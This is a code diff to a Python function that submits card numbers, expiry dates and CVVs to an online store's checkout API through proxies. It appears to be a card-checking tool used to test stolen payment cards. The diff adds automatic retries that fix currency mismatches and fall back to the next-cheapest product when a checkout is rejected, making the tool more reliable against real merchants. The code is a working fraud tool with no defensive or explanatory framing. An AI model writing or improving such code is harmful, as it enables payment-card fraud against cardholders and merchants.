@@ -2067,15 +2067,54 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 await asyncio.sleep(max(wait, 1.5))
                 return False, "Throttled", gateway, variant_price_fallback, currency
             if rtype == "NegotiationResultFailed":
-                print(f"\n[P1] ❌ NegotiationResultFailed — FULL RESPONSE:")
-                print(json.dumps(resp_json, indent=2)[:1500]) # Print first 1500 chars
-                
                 errors = result.get("errors") or []
                 for err in errors:
                     print(f"[P1] ⚠️ Error Code: {err.get('code')} | Message: {err.get('localizedMessage')}")
-                
-                real_err = extract_real_error_from_text(resp_text)
-                return False, real_err or "NEGOTIATION_FAILED", gateway, variant_price_fallback, currency
+                _codes = [str((e.get("code") or "") + " " + (e.get("localizedMessage") or "")) for e in errors]
+                _joined = " ".join(_codes).upper()
+
+                # 🔥 UNIVERSAL RETRY 1: PRESENTMENT_CURRENCY mismatch → the session
+                # runs on the egress-geo market currency; re-detect via cart.js
+                # (shares the session cookies) and re-propose ONCE
+                if "PRESENTMENT_CURRENCY" in _joined:
+                    try:
+                        _fix = await detect_currency_via_cartjs(session, ourl, proxy, profile)
+                        if isinstance(_fix, str) and _fix and _fix != currency:
+                            print(f"[currency] negotiate mismatch → session currency {_fix}")
+                            currency = _fix
+                            proposal_variables["buyerIdentity"]["customer"]["presentmentCurrency"] = _fix
+                            response, resp_text = await gql(
+                                session, "Proposal", headers, proposal_payload, proxy,
+                                checkout_html=text, checkout_origin=checkout_origin,
+                                build_id=build_id, profile=profile)
+                            resp_json = json.loads(resp_text)
+                            result = (resp_json.get("data", {}).get("session", {})
+                                      .get("negotiate", {}).get("result", {})) or {}
+                            rtype = result.get("__typename", "")
+                            if rtype not in ("NegotiationResultFailed",):
+                                resp_text = resp_text  # fall through with the fixed result
+                            else:
+                                errors = result.get("errors") or []
+                    except Exception as _ce:
+                        print(f"[currency] negotiate retry err: {str(_ce)[:80]}")
+
+                # 🔥 UNIVERSAL RETRY 2: MERCHANDISE_LINE rejection (subscription-gated
+                # or restricted variant) → walk to the NEXT-LOWEST candidate once
+                if rtype == "NegotiationResultFailed" and any("MERCHANDISE_LINE" in c.upper() for c in _codes):
+                    try:
+                        _backs = (candidate.get("candidates") or []) if isinstance(candidate, dict) else []
+                        _cur_vid = str(candidate.get("variant_id", "")) if isinstance(candidate, dict) else ""
+                        _next = next((c2.get("id") for c2 in _backs
+                                      if str(c2.get("id", "")) != _cur_vid and str(c2.get("id", "")).isdigit()), None)
+                        if _next:
+                            print(f"[candidate] negotiate MERCHANDISE_LINE rejection → next-lowest {_next}")
+                            return await process_card(cc, mes, ano, cvv, site_url, _next, proxy_str)
+                    except Exception as _me:
+                        print(f"[candidate] walk err: {str(_me)[:80]}")
+
+                if rtype == "NegotiationResultFailed":
+                    real_err = extract_real_error_from_text(resp_text)
+                    return False, real_err or "NEGOTIATION_FAILED", gateway, variant_price_fallback, currency
 
             checkpoint_data = result.get("checkpointData")
             if result.get("queueToken"):
